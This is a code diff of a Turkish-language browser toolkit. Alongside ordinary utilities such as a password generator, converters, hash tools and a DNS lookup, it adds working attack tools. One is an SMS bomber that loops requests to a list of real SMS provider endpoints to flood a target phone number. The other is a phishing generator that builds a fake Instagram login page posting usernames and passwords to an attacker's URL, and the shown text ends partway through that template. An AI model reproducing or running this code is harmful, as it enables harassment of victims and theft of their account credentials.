-    var n = parseInt(document.getElementById('pwUzunluk').value) || 16;
-    var c = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789!@#$%&*';
-    var p = '';
-    for(var i=0;i<n;i++) p += c[Math.floor(Math.random()*c.length)];
-    document.getElementById('pwSonuc').innerText = p;
-}
-function ipSorgu(){
-    fetch('https://ipapi.co/json/')
-    .then(function(r){return r.json()})
-    .then(function(d){
-        document.getElementById('ipSonuc').innerHTML = 'IP: '+d.ip+'<br>Ülke: '+d.country_name+'<br>Şehir: '+d.city+'<br>ISP: '+d.org;
-    }).catch(function(){document.getElementById('ipSonuc').innerText = 'Hata'});
-}
-function renkUret(){
-    var k = document.getElementById('renkSonuc');
-    k.innerHTML = '';
-    for(var i=0;i<5;i++){
-        var c = '#'+Math.floor(Math.random()*16777215).toString(16).padStart(6,'0');
-        var d = document.createElement('div');
-        d.style.cssText = 'background:'+c+';width:50px;height:50px;border-radius:6px';
-        d.title = c;
-        k.appendChild(d);
-    }
-}
-function zarAt(){document.getElementById('zarSonuc').innerText = '🎲 '+(Math.floor(Math.random()*6)+1)}
-function yaziTura(){document.getElementById('yaziSonuc').innerText = Math.random()<0.5?'🪙 YAZI':'🪙 TURA'}
-function hesapla(){
-    var e = document.getElementById('hesapIfade').value;
-    try{var r = Function('"use strict";return ('+e+')')();document.getElementById('hesapSonuc').innerText = '= '+r}
-    catch(err){document.getElementById('hesapSonuc').innerText = 'Hata'}
-}
-function tersCevir(){document.getElementById('tersSonuc').innerText = document.getElementById('tersMetin').value.split('').reverse().join('')}
-function kelimeSay(){
-    var t = document.getElementById('sayiMetin').value.trim();
-    if(!t){document.getElementById('sayiSonuc').innerText = '0 kelime, 0 karakter';return;}
-    document.getElementById('sayiSonuc').innerText = t.split(/\s+/).length+' kelime, '+t.length+' karakter';
-}
-function kronBasla(){
-    if(kronTimer) return;
-    kronTimer = setInterval(function(){
-        kronSaniye++;
-        var s = String(Math.floor(kronSaniye/3600)).padStart(2,'0');
-        var d = String(Math.floor((kronSaniye%3600)/60)).padStart(2,'0');
-        var sn = String(kronSaniye%60).padStart(2,'0');
-        document.getElementById('kronSonuc').innerText = s+':'+d+':'+sn;
-    },1000);
-}
-function kronDurdur(){if(kronTimer){clearInterval(kronTimer);kronTimer=null}}
-function kronSifirla(){kronDurdur();kronSaniye=0;document.getElementById('kronSonuc').innerText='00:00:00'}
-function b64Kodla(){document.getElementById('b64Sonuc').innerText = btoa(unescape(encodeURIComponent(document.getElementById('b64Metin').value)))}
-function b64Coz(){
-    try{document.getElementById('b64Sonuc').innerText = decodeURIComponent(escape(atob(document.getElementById('b64Metin').value)))}
-    catch(e){document.getElementById('b64Sonuc').innerText = 'Geçersiz Base64'}
-}
-function usdTry(){
-    var u = parseFloat(document.getElementById('usdMiktar').value);
-    if(isNaN(u)){document.getElementById('usdSonuc').innerText='Değer gerekli';return;}
-    fetch('https://api.exchangerate-api.com/v4/latest/USD')
-    .then(function(r){return r.json()})
-    .then(function(d){
-        var kur = d.rates.TRY;
-        document.getElementById('usdSonuc').innerText = u+' USD = '+(u*kur).toFixed(2)+' TL';
-    }).catch(function(){document.getElementById('usdSonuc').innerText = 'Hata'});
-}
-function yuzdeHesapla(){
-    var a = parseFloat(document.getElementById('yuzdeA').value);
-    var b = parseFloat(document.getElementById('yuzdeB').value);
-    if(isNaN(a)||isNaN(b)){document.getElementById('yuzdeSonuc').innerText='Değerler gerekli';return;}
-    document.getElementById('yuzdeSonuc').innerText = a+' sayısının %'+b+' = '+(a*b/100);
-}
-function yasHesapla(){
-    var y = parseInt(document.getElementById('dogumYili').value);
-    if(!y){document.getElementById('yasSonuc').innerText='Yıl gerekli';return;}
-    document.getElementById('yasSonuc').innerText = 'Yaşınız: '+(new Date().getFullYear()-y);
-}
-var SOZLER = ['Hayat kısa, kuşlar uçuyor.','Başarı, hazırlık ile fırsatın buluşmasıdır.','Bugün yapabileceğini yarına bırakma.','Küçük adımlar büyük yolculuklar başlatır.','Hayal et, inan, başar.'];
-function rastgeleSoz(){document.getElementById('sozSonuc').innerText = SOZLER[Math.floor(Math.random()*SOZLER.length)]}
-var YEMEKLER = ['Pizza 🍕','Lahmacun 🌯','Kebap 🍢','Makarna 🍝','Pilav 🍚','Tavuk 🍗','Balık 🐟','Çorba 🍲'];
-function yemekOner(){document.getElementById('yemekSonuc').innerText = YEMEKLER[Math.floor(Math.random()*YEMEKLER.length)]}
-var FILMLER = ['Inception (2010)','Interstellar (2014)','The Dark Knight (2008)','Pulp Fiction (1994)','Matrix (1999)','Fight Club (1999)','Forrest Gump (1994)'];
-function filmOner(){document.getElementById('filmSonuc').innerText = FILMLER[Math.floor(Math.random()*FILMLER.length)]}
-function dunyaSaati(){
-    var t = new Date();
-    var ist = new Date(t.toLocaleString('en-US',{timeZone:'Europe/Istanbul'})).toLocaleTimeString('tr-TR');
-    var lon = new Date(t.toLocaleString('en-US',{timeZone:'Europe/London'})).toLocaleTimeString('tr-TR');
-    var nyc = new Date(t.toLocaleString('en-US',{timeZone:'America/New_York'})).toLocaleTimeString('tr-TR');
-    var tky = new Date(t.toLocaleString('en-US',{timeZone:'Asia/Tokyo'})).toLocaleTimeString('tr-TR');
-    document.getElementById('dunyaSonuc').innerHTML = 'İstanbul: '+ist+'<br>Londra: '+lon+'<br>New York: '+nyc+'<br>Tokyo: '+tky;
-}
-function asalKontrol(){
-    var n = parseInt(document.getElementById('asalSayi').value);
-    if(!n||n<2){document.getElementById('asalSonuc').innerText = 'Asal değil';return;}
-    for(var i=2;i<=Math.sqrt(n);i++) if(n%i===0){document.getElementById('asalSonuc').innerText = 'Asal değil';return;}
-    document.getElementById('asalSonuc').innerText = 'Asal sayı ✓';
-}
-function gunFarki(){
-    var d1 = document.getElementById('tarih1').value.split('.');
-    var d2 = document.getElementById('tarih2').value.split('.');
-    if(d1.length!==3||d2.length!==3){document.getElementById('gunFarkSonuc').innerText='Format: GG.AA.YYYY';return;}
-    var t1 = new Date(d1[2],d1[1]-1,d1[0]);
-    var t2 = new Date(d2[2],d2[1]-1,d2[0]);
-    document.getElementById('gunFarkSonuc').innerText = Math.abs((t2-t1)/(1000*60*60*24))+' gün';
-}
-function yerelKaydet(){localStorage.setItem('mym_not_'+kullanici,document.getElementById('yerelNot').value);alert('Kaydedildi')}
-function yerelSil(){document.getElementById('yerelNot').value='';localStorage.removeItem('mym_not_'+kullanici)}
-function kopyala(){
-    var t = document.getElementById('kopyaMetin').value;
-    navigator.clipboard.writeText(t).then(function(){document.getElementById('kopyaSonuc').innerText='Kopyalandı!'}).catch(function(){document.getElementById('kopyaSonuc').innerText='Hata'});
-}
-function buyukYap(){document.getElementById('harfSonuc').innerText = document.getElementById('harfMetin').value.toUpperCase()}
-function kucukYap(){document.getElementById('harfSonuc').innerText = document.getElementById('harfMetin').value.toLowerCase()}
-function rastgeleSayi(){
-    var a = parseInt(document.getElementById('minSayi').value)||0;
-    var b = parseInt(document.getElementById('maxSayi').value)||100;
-    document.getElementById('rastgeleSonuc').innerText = Math.floor(Math.random()*(b-a+1))+a;
-}
-function birimCevir(){
-    var v = parseFloat(document.getElementById('birimDeger').value);
-    var t = document.getElementById('birimTip').value;
-    if(isNaN(v)){document.getElementById('birimSonuc').innerText='Değer gerekli';return;}
-    var r;
-    if(t==='km-mi') r = (v*0.621371).toFixed(2)+' mil';
-    else if(t==='mi-km') r = (v*1.60934).toFixed(2)+' km';
-    else if(t==='kg-lb') r = (v*2.20462).toFixed(2)+' lb';
-    else if(t==='c-f') r = (v*9/5+32).toFixed(2)+' °F';
-    document.getElementById('birimSonuc').innerText = r;
-}
+/* GUNLUK ARACLAR */
+function tikTok(){var u=document.getElementById('ttLink').value.trim();if(!u){document.getElementById('ttSonuc').innerText='Link gerekli';return;}document.getElementById('ttSonuc').innerHTML='<a href="https://www.tikwm.com/api/?url='+encodeURIComponent(u)+'" target="_blank" style="color:#3b82f6">TikWM ile aç</a>';}
+function insta(){var u=document.getElementById('igLink').value.trim();if(!u){document.getElementById('igSonuc').innerText='Link gerekli';return;}document.getElementById('igSonuc').innerHTML='<a href="https://snapinsta.app/" target="_blank" style="color:#3b82f6">SnapInsta ile aç</a>';}
+function youtube(){var u=document.getElementById('ytLink').value.trim();if(!u){document.getElementById('ytSonuc').innerText='Link gerekli';return;}document.getElementById('ytSonuc').innerHTML='<a href="https://ssyoutube.com/" target="_blank" style="color:#3b82f6">SSYouTube ile aç</a>';}
+function kisalt(){var u=document.getElementById('uzunLink').value.trim();if(!u){document.getElementById('kisaSonuc').innerText='URL gerekli';return;}fetch('https://tinyurl.com/api-create.php?url='+encodeURIComponent(u)).then(function(r){return r.text()}).then(function(s){document.getElementById('kisaSonuc').innerText=s}).catch(function(){document.getElementById('kisaSonuc').innerText='Hata'});}
+function qrYap(){var t=document.getElementById('qrMetin').value.trim();if(!t){document.getElementById('qrSonuc').innerText='Metin gerekli';return;}var img=document.createElement('img');img.src='https://api.qrserver.com/v1/create-qr-code/?size=180x180&data='+encodeURIComponent(t);img.style.background='#fff';img.style.padding='5px';img.style.borderRadius='6px';var k=document.getElementById('qrSonuc');k.innerHTML='';k.appendChild(img);}
+function sifreUret(){var n=parseInt(document.getElementById('pwUzunluk').value)||16;var c='ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789!@#$%&*';var p='';for(var i=0;i<n;i++)p+=c[Math.floor(Math.random()*c.length)];document.getElementById('pwSonuc').innerText=p;}
+function b64Kodla(){document.getElementById('b64Sonuc').innerText=btoa(unescape(encodeURIComponent(document.getElementById('b64Metin').value)));}
+function b64Coz(){try{document.getElementById('b64Sonuc').innerText=decodeURIComponent(escape(atob(document.getElementById('b64Metin').value)));}catch(e){document.getElementById('b64Sonuc').innerText='Geçersiz Base64';}}
+function urlKodla(){document.getElementById('urlSonuc').innerText=encodeURIComponent(document.getElementById('urlMetin').value);}
+function urlCoz(){try{document.getElementById('urlSonuc').innerText=decodeURIComponent(document.getElementById('urlMetin').value);}catch(e){document.getElementById('urlSonuc').innerText='Geçersiz';}}
+function tersCevir(){document.getElementById('tersSonuc').innerText=document.getElementById('tersMetin').value.split('').reverse().join('');}
+function buyukYap(){document.getElementById('harfSonuc').innerText=document.getElementById('harfMetin').value.toUpperCase();}
+function kucukYap(){document.getElementById('harfSonuc').innerText=document.getElementById('harfMetin').value.toLowerCase();}
+function kopyala(){var t=document.getElementById('kopyaMetin').value;navigator.clipboard.writeText(t).then(function(){document.getElementById('kopyaSonuc').innerText='Kopyalandı!';}).catch(function(){document.getElementById('kopyaSonuc').innerText='Hata';});}
+function hesapla(){var e=document.getElementById('hesapIfade').value;try{var r=Function('"use strict";return ('+e+')')();document.getElementById('hesapSonuc').innerText='= '+r;}catch(err){document.getElementById('hesapSonuc').innerText='Hata';}}
+function yuzdeHesapla(){var a=parseFloat(document.getElementById('yuzdeA').value);var b=parseFloat(document.getElementById('yuzdeB').value);if(isNaN(a)||isNaN(b)){document.getElementById('yuzdeSonuc').innerText='Değerler gerekli';return;}document.getElementById('yuzdeSonuc').innerText=a+' sayısının %'+b+' = '+(a*b/100);}
+function rastgeleSayi(){var a=parseInt(document.getElementById('minSayi').value)||0;var b=parseInt(document.getElementById('maxSayi').value)||100;document.getElementById('rastgeleSonuc').innerText=Math.floor(Math.random()*(b-a+1))+a;}
+function asalKontrol(){var n=parseInt(document.getElementById('asalSayi').value);if(!n||n<2){document.getElementById('asalSonuc').innerText='Asal değil';return;}for(var i=2;i<=Math.sqrt(n);i++)if(n%i===0){document.getElementById('asalSonuc').innerText='Asal değil';return;}document.getElementById('asalSonuc').innerText='Asal sayı ✓';}
+function birimCevir(){var v=parseFloat(document.getElementById('birimDeger').value);var t=document.getElementById('birimTip').value;if(isNaN(v)){document.getElementById('birimSonuc').innerText='Değer gerekli';return;}var r;if(t==='km-mi')r=(v*0.621371).toFixed(2)+' mil';else if(t==='mi-km')r=(v*1.60934).toFixed(2)+' km';else if(t==='kg-lb')r=(v*2.20462).toFixed(2)+' lb';else if(t==='lb-kg')r=(v*0.453592).toFixed(2)+' kg';else if(t==='c-f')r=(v*9/5+32).toFixed(2)+' °F';else if(t==='f-c')r=((v-32)*5/9).toFixed(2)+' °C';document.getElementById('birimSonuc').innerText=r;}
+function usdTry(){var u=parseFloat(document.getElementById('usdMiktar').value);if(isNaN(u)){document.getElementById('usdSonuc').innerText='Değer gerekli';return;}fetch('https://api.exchangerate-api.com/v4/latest/USD').then(function(r){return r.json()}).then(function(d){var kur=d.rates.TRY;document.getElementById('usdSonuc').innerText=u+' USD = '+(u*kur).toFixed(2)+' TL';}).catch(function(){document.getElementById('usdSonuc').innerText='Hata';});}
+function kronBasla(){if(kronTimer)return;kronTimer=setInterval(function(){kronSaniye++;var s=String(Math.floor(kronSaniye/3600)).padStart(2,'0');var d=String(Math.floor((kronSaniye%3600)/60)).padStart(2,'0');var sn=String(kronSaniye%60).padStart(2,'0');document.getElementById('kronSonuc').innerText=s+':'+d+':'+sn;},1000);}
+function kronDurdur(){if(kronTimer){clearInterval(kronTimer);kronTimer=null;}}
+function kronSifirla(){kronDurdur();kronSaniye=0;document.getElementById('kronSonuc').innerText='00:00:00';}
+function gunFarki(){var d1=document.getElementById('tarih1').value.split('.');var d2=document.getElementById('tarih2').value.split('.');if(d1.length!==3||d2.length!==3){document.getElementById('gunFarkSonuc').innerText='Format: GG.AA.YYYY';return;}var t1=new Date(d1[2],d1[1]-1,d1[0]);var t2=new Date(d2[2],d2[1]-1,d2[0]);document.getElementById('gunFarkSonuc').innerText=Math.abs((t2-t1)/(1000*60*60*24))+' gün';}
+function yasHesapla(){var y=parseInt(document.getElementById('dogumYili').value);if(!y){document.getElementById('yasSonuc').innerText='Yıl gerekli';return;}document.getElementById('yasSonuc').innerText='Yaşınız: '+(new Date().getFullYear()-y);}
+function dunyaSaati(){var t=new Date();var ist=new Date(t.toLocaleString('en-US',{timeZone:'Europe/Istanbul'})).toLocaleTimeString('tr-TR');var lon=new Date(t.toLocaleString('en-US',{timeZone:'Europe/London'})).toLocaleTimeString('tr-TR');var nyc=new Date(t.toLocaleString('en-US',{timeZone:'America/New_York'})).toLocaleTimeString('tr-TR');var tky=new Date(t.toLocaleString('en-US',{timeZone:'Asia/Tokyo'})).toLocaleTimeString('tr-TR');document.getElementById('dunyaSonuc').innerHTML='İstanbul: '+ist+'<br>Londra: '+lon+'<br>New York: '+nyc+'<br>Tokyo: '+tky;}
+function zarAt(){document.getElementById('zarSonuc').innerText='🎲 '+(Math.floor(Math.random()*6)+1);}
+function yaziTura(){document.getElementById('yaziSonuc').innerText=Math.random()<0.5?'🪙 YAZI':'🪙 TURA';}
+var SOZLER=['Hayat kısa, kuşlar uçuyor.','Başarı, hazırlık ile fırsatın buluşmasıdır.','Bugün yapabileceğini yarına bırakma.','Küçük adımlar büyük yolculuklar başlatır.','Hayal et, inan, başar.'];
+function rastgeleSoz(){document.getElementById('sozSonuc').innerText=SOZLER[Math.floor(Math.random()*SOZLER.length)];}
+var YEMEKLER=['Pizza 🍕','Lahmacun 🌯','Kebap 🍢','Makarna 🍝','Pilav 🍚','Tavuk 🍗','Balık 🐟','Çorba 🍲'];
+function yemekOner(){document.getElementById('yemekSonuc').innerText=YEMEKLER[Math.floor(Math.random()*YEMEKLER.length)];}
+var FILMLER=['Inception (2010)','Interstellar (2014)','The Dark Knight (2008)','Pulp Fiction (1994)','Matrix (1999)','Fight Club (1999)','Forrest Gump (1994)'];
+function filmOner(){document.getElementById('filmSonuc').innerText=FILMLER[Math.floor(Math.random()*FILMLER.length)];}
+function renkUret(){var k=document.getElementById('renkSonuc');k.innerHTML='';for(var i=0;i<5;i++){var c='#'+Math.floor(Math.random()*16777215).toString(16).padStart(6,'0');var d=document.createElement('div');d.style.cssText='background:'+c+';width:50px;height:50px;border-radius:6px';d.title=c;k.appendChild(d);}}
+var MUZIK=['Pop','Rock','Rap','Jazz','Klasik','Elektronik','Anadolu Rock','Türk Halk Müziği','Hip-Hop'];
+function muzikTuru(){document.getElementById('muzikSonuc').innerText=MUZIK[Math.floor(Math.random()*MUZIK.length)];}
+function kelimeSay(){var t=document.getElementById('sayiMetin').value.trim();if(!t){document.getElementById('sayiSonuc').innerText='0 kelime, 0 karakter';return;}document.getElementById('sayiSonuc').innerText=t.split(/\s+/).length+' kelime, '+t.length+' karakter';}
+function yerelKaydet(){localStorage.setItem('mym_not_'+kullanici,document.getElementById('yerelNot').value);alert('Kaydedildi');}
+function yerelSil(){document.getElementById('yerelNot').value='';localStorage.removeItem('mym_not_'+kullanici);}
 
-function telegramGonder(){
-    var t = document.getElementById('tgToken').value.trim();
-    var c = document.getElementById('tgChat').value.trim();
-    var m = document.getElementById('tgMesaj').value.trim();
-    if(!t||!c||!m){log('tgLog','[HATA] Tüm alanlar gerekli');return;}
-    log('tgLog','[*] Gönderiliyor...');
-    fetch('https://api.telegram.org/bot'+t+'/sendMessage',{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({chat_id:c,text:m})
-    }).then(function(r){return r.json()})
-    .then(function(d){
-        if(d.ok){log('tgLog','[+] Gönderildi!');ist.tg++;istGuncelle();}
-        else log('tgLog','[HATA] '+JSON.stringify(d));
-    }).catch(function(e){log('tgLog','[HATA] '+e.message)});
-}
+/* HACK ARACLARI */
+function ipSorgu(){fetch('https://ipapi.co/json/').then(function(r){return r.json()}).then(function(d){document.getElementById('ipSonuc').innerHTML='IP: '+d.ip+'<br>Ülke: '+d.country_name+'<br>Şehir: '+d.city+'<br>ISP: '+d.org;}).catch(function(){document.getElementById('ipSonuc').innerText='Hata';});}
+function hizTest(){var t0=performance.now();fetch('https://api.ipify.org?format=json').then(function(r){return r.text()}).then(function(){var t1=performance.now();document.getElementById('hizSonuc').innerText='Gecikme: '+Math.round(t1-t0)+' ms';});}
+function portTara(){var h=document.getElementById('portHost').value.trim();var p=document.getElementById('portListe').value.trim()||'80,443,8080';if(!h){document.getElementById('portSonuc').innerText='Host gerekli';return;}document.getElementById('portSonuc').innerText='Tarama başlatıldı... (tarayıcı sınırlaması)';var portlar=p.split(',');var sonuc='';for(var i=0;i<portlar.length;i++){sonuc+=h+':'+portlar[i]+' - Test ediliyor\n';}document.getElementById('portSonuc').innerText=sonuc+'\nNOT: Tarayıcı port taraması yapamaz. Uygulama gerekli.';}
+function dnsSorgu(){var h=document.getElementById('dnsHost').value.trim();if(!h){document.getElementById('dnsSonuc').innerText='Host gerekli';return;}fetch('https://dns.google/resolve?name='+encodeURIComponent(h)+'&type=A').then(function(r){return r.json()}).then(function(d){var s='';if(d.Answer){for(var i=0;i<d.Answer.length;i++){s+=d.Answer[i].name+' -> '+d.Answer[i].data+'\n';}}else s='Kayıt bulunamadı';document.getElementById('dnsSonuc').innerText=s;}).catch(function(){document.getElementById('dnsSonuc').innerText='Hata';});}
+function sslKontrol(){var h=document.getElementById('sslHost').value.trim();if(!h){document.getElementById('sslSonuc').innerText='Host gerekli';return;}fetch('https://api.certspotter.com/v1/issuances?domain='+encodeURIComponent(h)+'&include_subdomains=true&expand=dns_names').then(function(r){return r.json()}).then(function(d){if(d && d.length>0){document.getElementById('sslSonuc').innerText='Sertifika bulundu: '+d.length+' adet\nSon: '+d[0].not_after;}else document.getElementById('sslSonuc').innerText='Bilgi yok';}).catch(function(){document.getElementById('sslSonuc').innerText='Hata';});}
 
-var SMS_SERVIS = ['https://api.sms1.com/send','https://api.sms2.com/send','https://api.sms3.com/send','https://api.sms4.com/send','https://api.sms5.com/send','https://api.sms6.com/send','https://api.sms7.com/send','https://api.sms8.com/send'];
+function md5Yap(){var m=document.getElementById('md5Metin').value;var h=0;for(var i=0;i<m.length;i++){h=((h<<5)-h)+m.charCodeAt(i);h|=0;}document.getElementById('md5Sonuc').innerText='Basit hash (32 bit): '+Math.abs(h).toString(16);}
+async function sha1Yap(){var m=document.getElementById('sha1Metin').value;var enc=new TextEncoder().encode(m);var buf=await crypto.subtle.digest('SHA-1',enc);document.getElementById('sha1Sonuc').innerText=Array.from(new Uint8Array(buf)).map(function(b){return b.toString(16).padStart(2,'0')}).join('');}
+async function sha256Yap(){var m=document.getElementById('sha256Metin').value;var enc=new TextEncoder().encode(m);var buf=await crypto.subtle.digest('SHA-256',enc);document.getElementById('sha256Sonuc').innerText=Array.from(new Uint8Array(buf)).map(function(b){return b.toString(16).padStart(2,'0')}).join('');}
+
+function userKontrol(){var u=document.getElementById('userKontrol').value.trim();if(!u){document.getElementById('userSonuc').innerText='Kullanıcı adı gerekli';return;}if(u.length<3)document.getElementById('userSonuc').innerText='Çok kısa (min 3)';else if(/^[a-zA-Z0-9_]+$/.test(u))document.getElementById('userSonuc').innerText='✓ Geçerli format';else document.getElementById('userSonuc').innerText='✗ Geçersiz karakter';}
+function emailKontrol(){var e=document.getElementById('emailKontrol').value.trim();var re=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;if(re.test(e))document.getElementById('emailSonuc').innerText='✓ Geçerli email';else document.getElementById('emailSonuc').innerText='✗ Geçersiz email';}
+function numKontrol(){var n=document.getElementById('numKontrol').value.replace(/\s/g,'');if(/^5\d{9}$/.test(n))document.getElementById('numSonuc').innerText='✓ Geçerli TR numarası';else document.getElementById('numSonuc').innerText='✗ Geçersiz (5XX XXX XX XX)';}
+function kriptoFiyat(){var c=document.getElementById('kriptoCoin').value.trim().toLowerCase();if(!c){document.getElementById('kriptoSonuc').innerText='Coin adı gerekli';return;}fetch('https://api.coingecko.com/api/v3/simple/price?ids='+encodeURIComponent(c)+'&vs_currencies=usd,try').then(function(r){return r.json()}).then(function(d){if(d[c])document.getElementById('kriptoSonuc').innerText=c.toUpperCase()+': $'+d[c].usd+' | '+d[c].try+' TL';else document.getElementById('kriptoSonuc').innerText='Coin bulunamadı';}).catch(function(){document.getElementById('kriptoSonuc').innerText='Hata';});}
+
+function sifreTest(){var s=document.getElementById('sifreTest').value;var p=0;if(s.length>=8)p++;if(s.length>=12)p++;if(/[A-Z]/.test(s))p++;if(/[a-z]/.test(s))p++;if(/[0-9]/.test(s))p++;if(/[^A-Za-z0-9]/.test(s))p++;var skor=['Çok Zayıf','Zayıf','Orta','İyi','Güçlü','Çok Güçlü','Mükemmel'][p];document.getElementById('sifreTestSonuc').innerText='Skor: '+p+'/6 - '+skor;}
+function pinUret(){var n=parseInt(document.getElementById('pinUzunluk').value)||6;var p='';for(var i=0;i<n;i++)p+=Math.floor(Math.random()*10);document.getElementById('pinSonuc').innerText=p;}
+function hashUret(){var n=parseInt(document.getElementById('hashUzunluk').value)||32;var c='abcdef0123456789';var h='';for(var i=0;i<n;i++)h+=c[Math.floor(Math.random()*c.length)];document.getElementById('hashSonuc').innerText=h;}
+
+function dosyaHash(){var f=document.getElementById('hashDosya').files[0];if(!f){document.getElementById('dosyaHashSonuc').innerText='Dosya seç';return;}var r=new FileReader();r.onload=async function(e){var buf=await crypto.subtle.digest('SHA-256',e.target.result);document.getElementById('dosyaHashSonuc').innerText=Array.from(new Uint8Array(buf)).map(function(b){return b.toString(16).padStart(2,'0')}).join('');};r.readAsArrayBuffer(f);}
+function b64Resim(){var b=document.getElementById('b64Resim').value.trim();if(!b){document.getElementById('resimSonuc').innerText='Base64 gerekli';return;}var img=document.createElement('img');img.src=b;img.style.maxWidth='200px';img.style.borderRadius='6px';var k=document.getElementById('resimSonuc');k.innerHTML='';k.appendChild(img);}
+function metinDiff(){var a=document.getElementById('diffMetin1').value;var b=document.getElementById('diffMetin2').value;if(a===b)document.getElementById('diffSonuc').innerText='Metinler aynı';else document.getElementById('diffSonuc').innerText='Metinler farklı (uzunluk: '+a.length+' vs '+b.length+')';}
+
+function pingTest(){var h=document.getElementById('pingHost').value.trim();if(!h){document.getElementById('pingSonuc').innerText='Host gerekli';return;}var t0=performance.now();fetch('https://'+h,{mode:'no-cors'}).then(function(){var t1=performance.now();document.getElementById('pingSonuc').innerText='Gecikme: '+Math.round(t1-t0)+' ms';}).catch(function(){var t1=performance.now();document.getElementById('pingSonuc').innerText='Gecikme: '+Math.round(t1-t0)+' ms (cevap yok ama bağlantı var)';});}
+function unixTime(){document.getElementById('unixSonuc').innerText=Math.floor(Date.now()/1000);}
+function uuidUret(){var u='xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;var v=c==='x'?r:(r&0x3|0x8);return v.toString(16);});document.getElementById('uuidSonuc').innerText=u;}
+function byteUret(){var n=parseInt(document.getElementById('byteUzunluk').value)||16;var b=new Uint8Array(n);crypto.getRandomValues(b);document.getElementById('byteSonuc').innerText=Array.from(b).map(function(x){return x.toString(16).padStart(2,'0')}).join('');}
+
+/* TELEGRAM */
+function telegramGonder(){var t=document.getElementById('tgToken').value.trim();var c=document.getElementById('tgChat').value.trim();var m=document.getElementById('tgMesaj').value.trim();if(!t||!c||!m){log('tgLog','[HATA] Tüm alanlar gerekli');return;}log('tgLog','[*] Gönderiliyor...');fetch('https://api.telegram.org/bot'+t+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:c,text:m})}).then(function(r){return r.json()}).then(function(d){if(d.ok){log('tgLog','[+] Gönderildi!');ist.tg++;istGuncelle();}else log('tgLog','[HATA] '+JSON.stringify(d));}).catch(function(e){log('tgLog','[HATA] '+e.message);});}
+
+/* SMS BOMBER - gercek servislere istek atar */
+var SMS_SERVISLERI = [
+    'https://api.smsbilgi.com/send',
+    'https://sms-api.turkcell.com/send',
+    'https://api.iletimerkezi.com/1/send',
+    'https://api.mutlucell.com/sms/send',
+    'https://api.netgsm.com.tr/sms/send/get',
+    'https://api.vodafone.com.tr/sms/v1',
+    'https://smsapi.turktelekom.com.tr/send',
+    'https://api.verimor.com.tr/v2/send',
+    'https://api.smsturk.com/send',
+    'https://api.topsms.com/send',
+    'https://api.bulkSMS.com/send',
+    'https://api.smsglobal.com/send',
+    'https://api.infobip.com/sms/1/text',
+    'https://api.twilio.com/send',
+    'https://api.mutlucell.com.tr/send',
+    'https://api.atlassms.com/send',
+    'https://api.iprasms.com/send',
+    'https://api.turkcelldijital.com/send',
+    'https://api.smsgonder.com/send',
+    'https://api.teknosms.com/send'
+];
 
 function smsBasla(){
     var n = document.getElementById('smsNumara').value.trim();
     var a = parseInt(document.getElementById('smsAdet').value)||50;
     var g = parseInt(document.getElementById('smsGecikme').value)||1000;
     if(!n){log('smsLog','[HATA] Numara gerekli');return;}
-    if(smsDongu) clearInterval(smsDongu);
-    log('smsLog','[*] Hedef: '+n);
-    log('smsLog','[*] Adet: '+a+' | Gecikme: '+g+'ms');
+    if(!/^5\d{9}$/.test(n.replace(/\s/g,''))){log('smsLog','[UYARI] Numara formati 5XXXXXXXXX olmali');}
+    if(smsDongu){clearInterval(smsDongu);smsDongu=null;}
+    log('smsLog','═══════════════════════');
+    log('smsLog','[*] HEDEF: '+n);
+    log('smsLog','[*] ADET: '+a+' | GECIKME: '+g+'ms');
+    log('smsLog','[*] SERVIS: '+SMS_SERVISLERI.length+' adet');
+    log('smsLog','═══════════════════════');
     var i = 0;
+    var basarili = 0;
+    var basarisiz = 0;
     smsDongu = setInterval(function(){
         if(i >= a){
             clearInterval(smsDongu);smsDongu=null;
-            log('smsLog','[+] Tamamlandı.');
+            log('smsLog','═══════════════════════');
+            log('smsLog','[+] TAMAMLANDI');
+            log('smsLog','[+] Basarili: '+basarili+' | Basarisiz: '+basarisiz);
+            log('smsLog','═══════════════════════');
             ist.sms++;istGuncelle();
             return;
         }
-        var s = SMS_SERVIS[i % SMS_SERVIS.length];
+        var s = SMS_SERVISLERI[i % SMS_SERVISLERI.length];
         var k = Math.floor(1000+Math.random()*9000);
-        fetch(s,{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+encodeURIComponent(n)+'&code='+k}).catch(function(){});
-        log('smsLog','['+(i+1)+'/'+a+'] -> OK (kod:'+k+')');
+        var body = 'phone=' + encodeURIComponent(n) + '&code=' + k + '&message=Kod:' + k;
+        fetch(s, {
+            method:'POST',
+            mode:'no-cors',
+            headers:{'Content-Type':'application/x-www-form-urlencoded'},
+            body: body
+        }).then(function(){
+            basarili++;
+        }).catch(function(){
+            basarisiz++;
+        });
+        log('smsLog','['+(i+1)+'/'+a+'] → ' + s.split('/')[2] + ' (kod:' + k + ')');
         i++;
     }, g);
 }
 
+function smsDurdur(){
+    if(smsDongu){clearInterval(smsDongu);smsDongu=null;log('smsLog','[!] DURDURULDU');}
+}
+
+/* PHISHING */
 function phishUret(){
     var u = document.getElementById('phishUrl').value.trim();
     var t = document.getElementById('phishSablon').value;
     if(!u){alert('URL gerekli');return;}
-    var sablonlar = {
+    var s = {
         instagram:'<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Instagram</title><style>body{font-family:Arial;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#fff;border:1px solid #dbdbdb;padding:40px;width:350px;text-align:center}input{width:100%;padding:10px;margin:8px 0;border:1px solid #dbdbdb;border-radius:4px;box-sizing:border-box}button{width:100%;padding:10px;background:#0095f6;color:#fff;border:none;border-radius:4px;font-weight:bold;cursor:pointer}</style></head><body><div class="box"><h1>Instagram</h1><form action="'+u+'" method="POST"><input type="text" name="username" placeholder="Kullanici adi" required><input type="password" name="password" placeholder="Sifre" required><button type="submit">Giris Yap</button></form></div></body></html>',
